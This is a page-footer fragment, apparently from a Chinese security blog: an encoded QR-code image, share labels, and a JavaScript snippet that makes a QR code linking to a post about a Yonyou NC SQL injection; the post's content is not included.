F1UVIH+s69pxchNRDUH3fp2tycZ/drj8vYOwJ4Z/W1y/rxS/x8zdIDoKf0tcvcyLEl4sQHW54vUO+jvB9fjt8DnF6fYtwmyLcrntODsnI7Suqd+w+pI+6CNH39XDU9n6/tlfX5X/qw7gfCIeg/fd4vUM8/TfBw39D3BdkinJxP826hvs5mPv26wjJQ3Dlq9ce+oLUwhzN20OE5Fe+OX1IXr2jOXW5qA7pA1yfQz7e7OfpP7LgNk24/WulPvWzr9M6SF+5+KgPpA5uaK3Ye8AtC3T7wIHh8wWE92C/H4w5uM+r39MDqaJr/dwJnB6I0+8ImTrMsW8dkuu6HEbf++l31C/Ug/SAYHm19MXSZgtSB0HzojVyEZ7LW7fH0wPZF13XP3cCh4FApuxTIEJ0CD67JUid/ayH6HJ9iA5BfdGc/B5CelgjQvR7teWZFyF18o4fHx9VdvjXwF/ig98OA3mQv+wfPoHlQCBPAQTdh08DRJeL5kR1EVKnv0Lzojk5pA/c0IxoVlQX1SE9uv7INy9C+kBQXbRf5+qFy4FYdOG/PYGnBwLj9GHkNeX9Wr0cmNf1PIw5GHnP7zkkC0E9CIegugij7uvRFyE5CKqLEB1G1J/h0wOZNbm0v3cC27e9j1r6lHTsdZCnQR1Grm4fOZzLmbd+hmZEM3JRXYTsQW4OosOI+qJ1HfVFSB/5Hq93yP403uB6+7bXvThdeUdYT3efhXmu9+/cHjDWw8h7DlDa0N7A8F3UFlhcwDxvP8s6V4fUy8VHeeD6tvfjzX6uP7LefSBwe7vN9rp6282ypZmH9IVgebMF8XudvNeoF3bvEYfcC4Lmq9ds6Ysw1qlbKxdhzMPIK3e9Q+oU3mhtA4FxWn3KEB9GfPRaIPlVv1U9pO6RD8nBDa2BaPK+h0e6PqQPBNU7QnwYsefk7meP20AMXfjaE9gGsp9SXa+2VV6t7kOeiq5XthbEr+v9Mr/X6lpdhLFevbIutbNoHaR3r4Po5vTlorrYdXlH85D7ANdfez/e7Gf76gQypUf7g/s5nwL7QPLqEN59GHX976D36th7wfyeEN36s3Xm4Ll671O4/ZFlswtfewLbQGo6tSDTdVul1eq8tFrqHcvbL0hfNfOdr3RzMPaBcLj9L0n2gHid26ujORHG+lV+pdtHhLEfhMMNt4FYdOFrT2D7chEyJafdt6UOyUFQXex1nUPqur6qX+kw79P7zjiMtTDyWc1eg+QhqAf3ua9FtG6P1ztkfxpvcL0cCGTaEHSvfboQH+Zo3VmEsU+v6/eXF5qF9CitFoy8tFrmHyGkHoJVW8s6mOuVqQXxIWhdeX0tB2LRhf/2BLaBOCnIFOWi24LRVxd7Xr0jpA8Eu28fiA8jmodRh9vftiBez8pX6L315eJKh/n9ep31MOZL3wZS5FqvP4HDJ/XVNN1q9zuHTF0dRm4f0dxZvsqpF8L9e0L8yu5X34seJA9BdRHmur7Y+3deuesdUqfwRmv7HDKbVu0TMn2YY2X2yz6QvNxM5+qQPIyoL/Z6+R7NinpyEXIvfQiHoLr5ziG57j/KmZ/h9Q6ZncoLtW0gkGlD0D057Y76ov6Kq0P6m4dw/RX2PKQOgnDDRz2+61sHuZfcvclh9LsO8eGI20AsuvC1J7ANZDVlOE4ROOwaGP5nNAg/BH8LcN93P5AcBNV/t9n+UYx6od6fIuSe9oHwuketrkN89crUWnH1PW4D2YvX9etOYBsIZLo10f3qW9t7dQ2p67nOIbmqubd6Xc/qq8v32D3Ivc10Xx2S0xf1RUhObk5UX6E5cZ/bBrIXr+vXncD2SX21hT5FyNMBwV5nXux+5zD26XUQH0a0D4w6HLk9IZ61Z9H6nu86pL86hFsHc26+8HqHeFpvgoeBQKYIQfdZ09uvrsthrFO3Vn4WV3WQ++jfw9W9rIH06jmIDkF96+Ri1+Udzc/wMJBZ6NL+3Qls32X1WzrVrsP4tHTfOhhzEA7BXieH+DCifc2JMObgyM2KMGbUO/769Wv6OQdSbx7C4Tn0NcGt7nqHeKpvgtvfspyWuNqfvgiZ7iqvbl5UF2HsY040J6rPsGdg3rvn7AVj3py4yql3tO4MXu+QM6f0DzPbf0MgTwWcw75HnwpIffflEB+C1ok9J18hpA9wiABf36/ZW4RR74U9B8mbg3Bz6iLEl3e0Do656x3ST+vFfBuIU3uEfb/mYZz2I733gXl9z3XufQpXHpzrDclBsPeD6HWvWt2Xl1dL/gxuA3mm6Mr+3AkcBgJ5CmDEs1uoJ6OW+bquJV9hZWp1H7KPlQ7x4YY92zkk2/W6/37p77W6hnk9RIcR7XMGDwM5U3Rlfu4E/nggkKehnpxaEA7B1dYrW0sfxjyM3FzVrFbPwNgDwq2HcOtg5F2H+Kt6detWXH+GfzyQWdNL+/4J/NhAfDogTxXcR1+CdaK6COs+ZkR7dIT0UO95iK8urvJdNw/zPvrW7fHHBuJNL3zuBA4D2U9rf71qawbOPQ32sa4jjH30Ibr8HkKyEPSeMOcw6va2riMkD3M8W9/7Fj8MpMRrve4EtoHAfNow6o+26tMBqTMP4d2H6OZEuK9DfDiiPURIxnuL+p2rd4T06br8UR8Y6yEcbrgNxKYXvvYEroG89vwPd/8fAAD//0GqzWgAAAAGSURBVAMABH906fQoNXoAAAAASUVORK5CYII=)

手机扫码阅读

漏洞扫描服务


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-oauidesigner-getMdPropertyJson-classId-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 